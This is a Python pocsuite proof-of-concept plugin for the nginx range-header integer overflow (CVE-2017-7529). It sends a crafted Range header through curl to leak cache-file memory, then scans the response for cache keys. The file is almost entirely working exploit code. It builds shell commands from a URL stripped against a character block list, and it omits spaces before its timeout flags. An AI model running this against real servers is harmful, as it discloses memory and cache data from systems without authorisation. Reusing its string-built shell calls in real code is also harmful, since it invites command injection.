#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

class NginxPOC(POCBase):
    vulID = '49'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2018-08-20' #漏洞公开的时间,不知道就写今天

    author = 'arr0w1' #  PoC作者的大名
    createDate = '2018-08-20'# 编写 PoC 的日期
    updateDate = '2018-08-20'# PoC 更新的时间,默认和编写时间一样
    references = ['']# 漏洞地址来源,0day不用写
    name = 'Nginx Remote Integer Overflow Vulnerability'# PoC 名称
    appPowerLink = ''# 漏洞厂商主页地址
    appName = 'nginx'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'Integer Overflows'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Nginx 整数溢出
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"中危" #严重,高危,中危,低危

    def _verify(self):
        #定义返回结果
        result = {}
        #获取漏洞url
        url = '%s' % self.url
        block_str = ['#', '&', ';', '`', '|', '*', '~', '<', '>', '^', '(', ')', '[', ']', '{', '}', '$', '\\', '\'',
                     '\"', '%']
        for str in block_str:
            url = url.replace(str, "")

        #如果设置端口则取端口,没有设置则为默认端口
        import os, commands
        print '[*]Testing for: ' + url
        
        cmd1 = 'curl -I ' + url + '--connect-timeout 5'
        try:
            os.popen(cmd1)
            os.popen(cmd1)
            re1 = commands.getoutput(cmd1).split('\n')
         
            hit = False
            has_x_proxy_cache = False
            img_len = 0
         
            for i in range(0,len(re1)):
                # print re1[i]
                if 'X-Proxy-Cache' in re1[i]:
                    has_x_proxy_cache = True
                    if 'HIT' in re1[i]:
                        hit = True
         
                if 'Content-Length' in re1[i]:
                    img_len = int(re1[i].split(' ')[1])
         
            if has_x_proxy_cache:
                if hit:
                    print '[*]X-Proxy-Cache is HIT.'
                    print '[*]The image length: ' + str(img_len)
         
                    len1 = img_len + 600
                    len2 = 0x8000000000000000 - len1
         
                    cmd2 = 'curl -i ' + url + ' -r -' + str(len1) + ',-' + str(len2) + '--connect-timeout 3'
                    re2 = commands.getoutput(cmd2).split('\n')
                    vul = False
                    for i in range(0,len(re2)):
         
                        if 'KEY' in re2[i]:
                            print '[+]Nginx Int Overflow(CVE-2017-7529) exists!'
                            print '[+]' + re2[i]
                            result['VerifyInfo'] = {}
                            result['VerifyInfo']['URL'] = url
                            result['VerifyInfo']['Payload'] = url
                            vul = True
         
                    if not vul:
                        print '[-]Can not find the vuln.'
                else:
                    print '[-]The X-Proxy-Cache is MISS.'
                    print '[-]Can not find the vuln.'
            else:
                print '[-]The header without X-Proxy-Cache.'
                print '[-]Can not find the vuln.'
        except Exception as e:
            # return host
            print e
       
        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        return self._verify()

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(NginxPOC)


